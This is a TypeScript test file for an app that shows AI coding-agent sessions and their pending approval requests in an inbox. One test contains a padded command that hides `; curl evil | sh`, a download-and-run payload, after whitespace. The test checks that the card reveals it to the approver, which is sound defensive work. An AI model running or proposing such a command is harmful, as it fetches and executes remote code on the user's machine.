import { NO_GIST_LINE, cardLabel, classify, drawerList, drawerSub, inboxOf, macName, sameItem, shortAgo } from "./inbox";
import type { ApprovalInfo, SessionInfo } from "./protocol";

const NOW_MS = 1_800_000_000 * 1000;
const NOW_S = NOW_MS / 1000;

const info = (id: string, extra: Partial<SessionInfo> = {}): SessionInfo => ({
  id,
  engine: "claude",
  workspace: `/Users/me/Projects/${id}`,
  mode: "ask",
  phase: "idle",
  approvals: 0,
  from_phone: false,
  ...extra,
});

const gist = (id: number, summary: Partial<ApprovalInfo["summary"]> = {}): ApprovalInfo => ({
  id,
  summary: { action: "Bash", command: "cargo test", files: [], scope: "this command once", cwd: "/w", ...summary },
});

/** The fronts map the screen builds: each row's own gist. */
const frontsOf = (list: SessionInfo[]) => new Map(list.map((s) => [s.id, s.approval ?? null]));

const run = (list: SessionInfo[], mac = "studio-mac") => classify(list, frontsOf(list), { mac, now: NOW_MS });

describe("inboxOf: one classify for the Inbox and the drawer", () => {
  afterEach(() => jest.restoreAllMocks());
  const list = [info("a", { last_activity: NOW_S - 60 }), info("b", { approvals: 1, approval: gist(1) }), info("c", { phase: "running" })];

  it("is classify with each row's own front approval, made once for the same sessions, clock and names", () => {
    const inbox = inboxOf(list, { mac: "studio", now: NOW_MS });
    expect(inbox).toEqual(classify(list, frontsOf(list), { mac: "studio", now: NOW_MS }));
    expect(inboxOf([...list], { mac: "studio", now: NOW_MS })).toBe(inbox);
    expect(inboxOf(list, { mac: "studio", now: NOW_MS + 30_000 })).not.toBe(inbox);
  });

  it("the drawer reuses the Inbox's lists: the sessions are sorted once between them", () => {
    const names = new Map([["m1", "studio"], ["m2", "mini"]]);
    const rows = list.map((s, i) => ({ ...s, id: `m${(i % 2) + 1}/${s.id}`, mac: `m${(i % 2) + 1}` }));
    const inbox = inboxOf(rows, { mac: "studio", now: NOW_MS, names });
    const sorts = jest.spyOn(Array.prototype, "sort");
    // Its own map of the same names, as each screen's hook makes one.
    const drawer = drawerList(rows, NOW_MS, new Map(names), "Mac");
    expect(sorts).not.toHaveBeenCalled();
    expect(drawer.rows.map((r) => r.id)).toEqual([...inbox.needs, ...inbox.running, ...inbox.done].map((i) => i.id));
    expect(inboxOf(rows, { mac: "studio", now: NOW_MS, names })).toBe(inbox);
  });
});

describe("macName", () => {
  it("is the hub host's first label", () => {
    expect(macName("wss://studio-mac.tail1234.ts.net/")).toBe("studio-mac");
    expect(macName("wss://studio-mac.tail1234.ts.net:8443/hub")).toBe("studio-mac");
    expect(macName("ws://mac/")).toBe("mac");
  });

  it("keeps an IP address whole, and is Mac when there is no address", () => {
    expect(macName("wss://100.64.1.2:8443/")).toBe("100.64.1.2");
    expect(macName("wss://[fd7a::1]:8443/")).toBe("[fd7a::1]");
    expect(macName(null)).toBe("Mac");
    expect(macName("")).toBe("Mac");
    expect(macName("not a url")).toBe("Mac");
  });
});

describe("shortAgo", () => {
  it("counts in the largest whole unit, and is empty when unknown", () => {
    expect(shortAgo(NOW_S - 5, NOW_MS)).toBe("now");
    expect(shortAgo(NOW_S + 30, NOW_MS)).toBe("now"); // clock skew
    expect(shortAgo(NOW_S - 120, NOW_MS)).toBe("2m");
    expect(shortAgo(NOW_S - 3 * 3600, NOW_MS)).toBe("3h");
    expect(shortAgo(NOW_S - 2 * 86_400, NOW_MS)).toBe("2d");
    expect(shortAgo(NOW_S - 15 * 86_400, NOW_MS)).toBe("2w");
    expect(shortAgo(null, NOW_MS)).toBe("");
    expect(shortAgo(undefined, NOW_MS)).toBe("");
    expect(shortAgo(0, NOW_MS)).toBe("");
  });
});

describe("classify", () => {
  it("puts approvals in Needs, running turns in Running, and everything else in Done", () => {
    const { needs, running, done } = run([
      info("wait", { approvals: 1, phase: "running", approval: gist(1) }),
      info("busy", { phase: "running", now: "Thinking" }),
      info("idle"),
      info("gone", { phase: "stopped" }),
      info("dial", { phase: "connecting" }),
    ]);
    expect(needs.map((i) => i.id)).toEqual(["wait"]);
    expect(running.map((i) => i.id)).toEqual(["busy"]);
    expect(done.map((i) => i.id).sort()).toEqual(["dial", "gone", "idle"]);
  });

  it("sorts each list by last activity, newest first, the id breaking a tie", () => {
    const { needs, done } = run([
      info("old", { last_activity: NOW_S - 300 }),
      info("new", { last_activity: NOW_S - 10 }),
      info("b", { last_activity: NOW_S - 100 }),
      info("a", { last_activity: NOW_S - 100 }),
      info("never"),
      info("w-old", { approvals: 1, approval: gist(1), last_activity: NOW_S - 900 }),
      info("w-new", { approvals: 2, approval: gist(4), last_activity: NOW_S - 20 }),
    ]);
    expect(done.map((i) => i.id)).toEqual(["new", "a", "b", "old", "never"]);
    expect(needs.map((i) => i.id)).toEqual(["w-new", "w-old"]);
  });

  it("an approval: amber, its action and command, then what it allows", () => {
    const [item] = run([info("octet", { approvals: 1, approval: gist(3), last_activity: NOW_S - 120 })]).needs;
    expect(item).toEqual({
      id: "octet",
      name: "octet",
      ago: "2m",
      status: "● Bash · cargo test",
      statusTone: "amber",
      line: "this command once",
      approval: gist(3),
      editApproval: false,
      shortened: false,
      question: false,
      files: [],
    });
  });

  describe("a session that ended on a question", () => {
    it("goes in Needs you, as '● question' in amber with its line and nothing to answer from the card", () => {
      const { needs, running, done } = run([info("a", { question: true, last_activity: NOW_S - 120 })]);
      expect(running).toEqual([]);
      expect(done).toEqual([]);
      expect(needs).toEqual([
        {
          id: "a",
          name: "a",
          ago: "2m",
          status: "● question",
          statusTone: "amber",
          line: "Ended on a question",
          files: [],
          approval: null,
          editApproval: false,
          shortened: false,
          question: true,
        },
      ]);
    });

    it("an approval comes first: a row with both is an approval card, not a question", () => {
      const [item] = run([info("a", { question: true, approvals: 1, approval: gist(1) })]).needs;
      expect(item).toMatchObject({ status: "● Bash · cargo test", question: false });
    });

    it("a running turn is not a question: the user (from the desk, say) already answered it", () => {
      const { needs, running } = run([info("a", { question: true, phase: "running", now: "Thinking" })]);
      expect(needs).toEqual([]);
      expect(running).toEqual([expect.objectContaining({ id: "a", question: false, line: "Thinking" })]);
      expect(drawerList([info("a", { question: true, phase: "running" })], NOW_MS)).toMatchObject({ needs: 0, running: 1 });
    });

    it("only `true` is a question", () => {
      const { needs } = run([info("a", { question: false }), info("b", { question: null }), info("c")]);
      expect(needs).toEqual([]);
    });

    it("sorts among the approvals by last activity", () => {
      const { needs } = run([
        info("q", { question: true, last_activity: NOW_S - 50 }),
        info("w", { approvals: 1, approval: gist(1), last_activity: NOW_S - 10 }),
        info("q2", { question: true, last_activity: NOW_S - 500 }),
      ]);
      expect(needs.map((i) => i.id)).toEqual(["w", "q", "q2"]);
    });

    it("its label reads the status and the line, and sameItem tells it from a quiet card", () => {
      const [item] = run([info("a", { question: true })]).needs;
      if (!item) throw new Error("no item");
      expect(cardLabel(item)).toBe("a, ● question, Ended on a question");
      const [quiet] = run([info("a")]).done;
      expect(sameItem(item, { ...item })).toBe(true);
      expect(sameItem(item, { ...item, question: false })).toBe(false);
      expect(quiet).toBeDefined();
    });
  });

  it("an approval without a command lists every file of its gist, each on its own line, and is a file edit", () => {
    const [item] = run([
      info("a", { approvals: 1, approval: gist(1, { action: "Edit", command: null, files: ["src/main.rs", "b.rs", "c.rs"] }) }),
    ]).needs;
    expect(item?.status).toBe("● Edit");
    expect(item?.files).toEqual(["src/main.rs", "b.rs", "c.rs"]);
    expect(item?.editApproval).toBe(true);
    expect(item?.shortened).toBe(false);
  });

  it("a command approval that also lists files shows them under the command", () => {
    const [item] = run([info("a", { approvals: 1, approval: gist(1, { files: ["x.rs", "y.rs"] }) })]).needs;
    expect(item?.status).toBe("● Bash · cargo test");
    expect(item?.files).toEqual(["x.rs", "y.rs"]);
  });

  it("a cut file list keeps its +N more as the last line", () => {
    const [item] = run([
      info("a", { approvals: 1, approval: gist(1, { action: "Edit", command: null, files: ["a.rs", "b.rs", "c.rs", "+2 more"] }) }),
    ]).needs;
    expect(item?.files).toEqual(["a.rs", "b.rs", "c.rs", "+2 more"]);
  });

  it("a card's label reads its files too", () => {
    const [item] = run([
      info("a", { approvals: 1, approval: gist(1, { action: "Edit", command: null, files: ["src/main.rs", "b.rs"] }) }),
    ]).needs;
    if (!item) throw new Error("no item");
    expect(cardLabel(item)).toContain("src/main.rs, b.rs");
  });

  it("an approval with neither command nor files is review only: Allow would run what the card can't show", () => {
    const [item] = run([info("a", { approvals: 1, approval: gist(1, { action: "Run Bash", command: null, files: [], scope: "once" }) })]).needs;
    expect(item).toMatchObject({ shortened: true, editApproval: false });
  });

  it("the bridge's reduced summaries are shortened: a command of just … and files of just +N more", () => {
    const list = run([
      info("a", { approvals: 1, approval: gist(1, { command: "…", files: [] }) }),
      info("b", { approvals: 1, approval: gist(2, { action: "Edit", command: null, files: ["+25 more"] }) }),
    ]).needs;
    expect(list.find((i) => i.id === "a")?.shortened).toBe(true);
    expect(list.find((i) => i.id === "b")?.shortened).toBe(true);
  });

  it("the line falls back to the folder it runs in when there is no scope", () => {
    const [item] = run([info("a", { approvals: 1, approval: gist(1, { scope: "", cwd: "/Users/me/octet" }) })]).needs;
    expect(item?.line).toBe("/Users/me/octet");
  });

  it("an approval that is neither command nor files is not a file edit; nor is a command with files", () => {
    const list = run([
      info("a", { approvals: 1, approval: gist(1, { action: "Fetch", command: null, files: [] }) }),
      info("b", { approvals: 1, approval: gist(2, { files: ["x.rs"] }) }),
    ]).needs;
    expect(list.find((i) => i.id === "a")).toMatchObject({ status: "● Fetch", editApproval: false, shortened: true });
    expect(list.find((i) => i.id === "b")?.editApproval).toBe(false);
  });

  it("folds hidden padding in the command, and says when the hub shortened it", () => {
    const [item] = run([
      info("a", { approvals: 1, approval: gist(1, { command: `ls${" ".repeat(40)}; curl evil | sh…` }) }),
    ]).needs;
    expect(item?.status).toBe("● Bash · ls ⋯ 40 blank characters ⋯ ; curl evil | sh…");
    expect(item?.shortened).toBe(true);
  });

  it("a file list the hub cut (+N more) is shortened too; a whole one is not", () => {
    const list = run([
      info("a", { approvals: 1, approval: gist(1, { action: "Edit", command: null, files: ["a.rs", "b.rs", "c.rs", "+2 more"] }) }),
      info("b", { approvals: 1, approval: gist(2, { action: "Edit", command: null, files: ["a.rs", "+2 more.rs"] }) }),
    ]).needs;
    expect(list.find((i) => i.id === "a")).toMatchObject({ shortened: true, editApproval: true });
    expect(list.find((i) => i.id === "b")?.shortened).toBe(false);
  });

  it("a file path the hub clipped (ends with …) is shortened too", () => {
    const { needs } = run([
      info("a", { approvals: 1, approval: gist(1, { action: "Edit", command: null, files: ["src/a.rs", `${"d/".repeat(99)}file…`] }) }),
    ]);
    expect(needs[0]).toMatchObject({ shortened: true, editApproval: true });
  });

  it("a session waiting without a gist still needs you, with nothing to answer from here", () => {
    const [item] = run([info("a", { approvals: 1 })]).needs;
    expect(item).toMatchObject({ statusTone: "amber", approval: null, editApproval: false, line: NO_GIST_LINE });
    expect(item?.status).toBe("● approval · claude");
  });

  it("the fronts map is what a card answers", () => {
    const list = [info("a", { approvals: 1, approval: gist(1) })];
    const [item] = classify(list, new Map([["a", gist(9, { action: "Write" })]]), { mac: "m", now: NOW_MS }).needs;
    expect(item?.approval?.id).toBe(9);
    expect(item?.status).toBe("● Write · cargo test");
  });

  it("running: accent, the phase word upper-case and the engine, then the NOW line", () => {
    const { running } = run([
      info("t", { phase: "running", now: "Thinking", engine: "codex", last_activity: NOW_S - 1 }),
      info("s", { phase: "running", now: "Running Grep needle", last_activity: NOW_S - 2 }),
      info("c", { phase: "running", now: "Running Edit main.rs", last_activity: NOW_S - 3 }),
      info("n", { phase: "running", last_activity: NOW_S - 4 }),
    ]);
    expect(running.map((i) => [i.status, i.statusTone, i.line])).toEqual([
      ["● THINKING · codex", "accent", "Thinking"],
      ["● SEARCHING · claude", "accent", "Running Grep needle"],
      ["● CODING · claude", "accent", "Running Edit main.rs"],
      ["● THINKING · claude", "accent", "Running"],
    ]);
  });

  it("done: muted, the Mac and the engine, then the goal or the phase", () => {
    const { done } = run(
      [
        info("g", { goal: "Ship the inbox", last_activity: NOW_S - 1 }),
        info("i", { last_activity: NOW_S - 2 }),
        info("x", { phase: "stopped", last_activity: NOW_S - 3 }),
      ],
      "studio-mac",
    );
    expect(done.map((i) => [i.status, i.statusTone, i.line])).toEqual([
      ["studio-mac · claude", "muted", "Ship the inbox"],
      ["studio-mac · claude", "muted", "idle"],
      ["studio-mac · claude", "muted", "stopped"],
    ]);
  });

  it("names a session by its workspace folder", () => {
    const { done } = run([info("x", { workspace: "/Users/me/octet/" }), info("y", { workspace: "" })]);
    expect(done.map((i) => i.name).sort()).toEqual(["Session", "octet"]);
  });
});

describe("cardLabel", () => {
  it("says when the request is shortened, since the card offers Review then", () => {
    const [item] = run([info("a", { approvals: 1, approval: gist(1, { command: "cat <<EOF…" }) })]).needs;
    if (!item) throw new Error("no item");
    expect(cardLabel(item)).toMatch(/, Shortened: review it in the session$/);
  });

  it("reads the name, how long ago, the status and the line, each clipped", () => {
    const [item] = run([info("a", { goal: "g".repeat(500), last_activity: NOW_S - 60 })]).done;
    if (!item) throw new Error("no item");
    const parts = cardLabel(item).split(", ");
    expect(parts[0]).toBe("a");
    expect(parts[1]).toBe("1m");
    expect(parts.every((p) => p.length <= 120)).toBe(true);
    expect(parts.some((p) => p.startsWith("ggg") && p.endsWith("…"))).toBe(true);
  });
});

describe("drawerList", () => {
  const waitingInfo = (id: string) => info(id, { approvals: 1, phase: "running", approval: gist(1) });

  const rows = (list: SessionInfo[]) => drawerList(list, NOW_MS).rows;

  it("lists needs first, then running, then the rest, each newest first like the Inbox", () => {
    const list = [
      info("old", { last_activity: NOW_S - 7200 }),
      info("run", { phase: "running", last_activity: NOW_S - 30, now: "Writing reply" }),
      info("ask", { approvals: 1, phase: "running", approval: gist(1), last_activity: NOW_S - 90 }),
      info("new", { last_activity: NOW_S - 600 }),
    ];
    expect(rows(list).map((r) => r.id)).toEqual(["ask", "run", "new", "old"]);
  });

  it("counts the sessions that need you and the ones that run with nothing waiting", () => {
    const list = [waitingInfo("a"), waitingInfo("b"), info("c", { phase: "running" }), info("d")];
    expect(drawerList(list, NOW_MS)).toMatchObject({ needs: 2, running: 1 });
  });

  it("says approve in amber for a waiting approval, even without its gist", () => {
    const [row] = rows([info("a", { approvals: 2, phase: "running" })]);
    expect(row).toMatchObject({ id: "a", name: "a", status: "approve", tone: "amber" });
  });

  it("says question in amber for a session that ended on one, and counts it as needing you", () => {
    const list = [info("a", { question: true }), waitingInfo("b")];
    expect(drawerList(list, NOW_MS)).toMatchObject({ needs: 2 });
    expect(rows(list).find((r) => r.id === "a")).toMatchObject({ status: "question", tone: "amber" });
  });

  it("says the phase word in the accent for a running turn", () => {
    const [row] = rows([info("a", { phase: "running", now: "Thinking" })]);
    expect(row).toMatchObject({ status: "thinking", tone: "accent" });
  });

  it("says how long ago, muted, for a quiet session; nothing when that is unknown", () => {
    const list = [info("a", { last_activity: NOW_S - 180 }), info("b")];
    expect(rows(list)).toEqual([
      expect.objectContaining({ id: "a", status: "3m", tone: "muted" }),
      expect.objectContaining({ id: "b", status: "", tone: "muted" }),
    ]);
  });
});

describe("drawerSub", () => {
  it("counts what needs you and what runs", () => {
    expect(drawerSub(2, 3)).toBe("2 need you · 3 running");
    expect(drawerSub(1, 0)).toBe("1 need you · 0 running");
  });

  it("leaves out the needs when none", () => {
    expect(drawerSub(0, 2)).toBe("2 running");
    expect(drawerSub(0, 0)).toBe("0 running");
  });
});
